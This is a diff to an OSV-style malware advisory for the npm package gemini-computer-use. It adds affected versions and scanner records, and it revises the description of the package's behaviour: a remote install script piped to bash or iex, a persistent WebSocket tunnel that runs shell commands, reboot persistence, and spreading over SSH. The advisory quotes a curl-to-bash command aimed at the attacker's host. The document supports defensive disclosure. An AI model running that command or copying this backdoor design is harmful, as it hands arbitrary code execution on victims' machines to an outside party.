@@ -2,9 +2,9 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-16355",
   "published": "2026-09-21T17:21:03Z",
-  "modified": "2026-10-29T14:15:56.790765775Z",
+  "modified": "2026-11-20T02:37:56.814507828Z",
   "summary": "Malicious code in gemini-computer-use (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (56b34e8766d76b6b5c93094a8c8288f85fbb505fef68634a7bdf395abaebb329)\nThe package's `bin/cli.js` — declared as both `main` and `bin` in package.json — unconditionally runs `curl -fsSL https://racknerd-5a24bf9.merino-carob.ts.net/install.sh | bash` on Linux/macOS and the PowerShell `Invoke-RestMethod... | iex` equivalent on Windows when invoked without a known subcommand. Because the same file is the module's main entry, any `require('gemini-computer-use')` reaches this code path as well. The fetch target is a Tailscale funnel host (`*.ts.net`) unrelated to the declared GitHub publisher, is unpinned, and has no hash or signature verification; whoever controls that funnel controls arbitrary code execution on the installer host. The installed component is an MCP server (core/server.py, core/mcp_tools.py) that exposes a `bash_exec` tool and opens an outbound websocket tunnel to a hardcoded gateway (default `https://smart-server.online`, bootstrapped via the same `racknerd-5a24bf9.merino-carob.ts.net` host) over `/sse?user=...&token=...`; commands relayed from the gateway are executed in a local shell on the installer host. install.sh configures systemd/launchd/Termux autostart so the shell channel persists across reboots. The MESH_TOKEN auth is optional and the destination is hardcoded, resulting in a remotely driven shell on the installer's machine triggered by install/first invocation.\n\n## Source: ossf-package-analysis (98cfd64c3f4382ad0470faa70a1604f84cb385a64dbc1eed9bbf68fd244ab887)\nThe OpenSSF Package Analysis project identified 'gemini-computer-use' @ 0.4.3 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5e9262ea9d7343df13605d463d04bd78f7f07b1692b21151c23835c39caedfed)\nOn `npx gemini-computer-use`, bin/cli.js fetches https://smart-server.online/install.sh (or install.ps1 on Windows) and pipes it to bash / iex, bypassing the shipped installers in the tarball; the bytes executed are whatever the author's web host returns at that moment, with no hash or signature verification. The installer then downloads core/agent.py, core/server.py, core/mcp_tools.py, core/vitals.py and skills/orchestrator.md from the same author host (falling back to the raw.githubusercontent.com main branch of LevRa7's repo) into ~/.gemini-computer-use and launches them as a long-running agent. core/agent.py opens a persistent WebSocket to wss://smart-server.online/ws/tunnel with a token minted by /api/register on the same host, and dispatches JSON-RPC tools/call messages into mcp_tools.handle_tool_call, which exposes a bash_exec tool backed by subprocess with a 120-second timeout — anyone controlling smart-server.online can run arbitrary shell on the host. install.ps1 drops antigravity-agent.vbs into the Windows Startup folder to relaunch `python -m core.agent` on every login with the registered MESH_TOKEN/MESH_GATEWAY, and install.sh installs an equivalent systemd unit on Linux, so the remote-command channel survives reboots. install.sh additionally supports --ssh=user@host with StrictHostKeyChecking=no and optional sshpass to replicate the agent and re-run install.sh on operator-supplied remote hosts. The default control plane is the author's domain, is not caller-configurable in a documented way, is not authenticated by a secret the installer provisioned independently, and the fetched agent code is unpinned and mutable.\n\n## Source: ossf-package-analysis (98cfd64c3f4382ad0470faa70a1604f84cb385a64dbc1eed9bbf68fd244ab887)\nThe OpenSSF Package Analysis project identified 'gemini-computer-use' @ 0.4.3 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
   "affected": [
     {
       "package": {
@@ -14,10 +14,34 @@
       "versions": [
         "0.1.2",
         "0.4.3",
-        "0.4.5"
+        "0.4.5",
+        "0.2.4",
+        "0.2.3",
+        "0.4.2",
+        "0.4.1"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -77,6 +101,22 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/gemini-computer-use/v/0.4.5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/gemini-computer-use/v/0.2.4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/gemini-computer-use/v/0.2.3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/gemini-computer-use/v/0.4.2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/gemini-computer-use/v/0.4.1"
     }
   ],
   "database_specific": {
@@ -127,6 +167,46 @@
         "source": "amazon-inspector",
         "versions": [
           "0.4.5"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-022924",
+        "import_time": "2026-11-20T02:36:32.028849143Z",
+        "modified_time": "2026-11-20T02:33:30Z",
+        "sha256": "2d80e7dc6878ebeed1f03af991e3ea15ad78e331f76be330cca52f3e19b58633",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.2.4"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-022923",
+        "import_time": "2026-11-20T02:36:31.808149844Z",
+        "modified_time": "2026-11-20T02:33:19Z",
+        "sha256": "5e9262ea9d7343df13605d463d04bd78f7f07b1692b21151c23835c39caedfed",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.2.3"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-022925",
+        "import_time": "2026-11-20T02:36:32.071813047Z",
+        "modified_time": "2026-11-20T02:33:36Z",
+        "sha256": "73119ad8a8c521c376ce7ed0380f448bb7f0f1f4719f180aef6dca1d9eabe2a1",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.4.2"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-022926",
+        "import_time": "2026-11-20T02:36:32.128957722Z",
+        "modified_time": "2026-11-20T02:33:44Z",
+        "sha256": "786ad22ac105f89069ab7066db79700e96c368bf69ed9e38046cb15d900eddd0",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.4.1"
         ]
       }
     ]
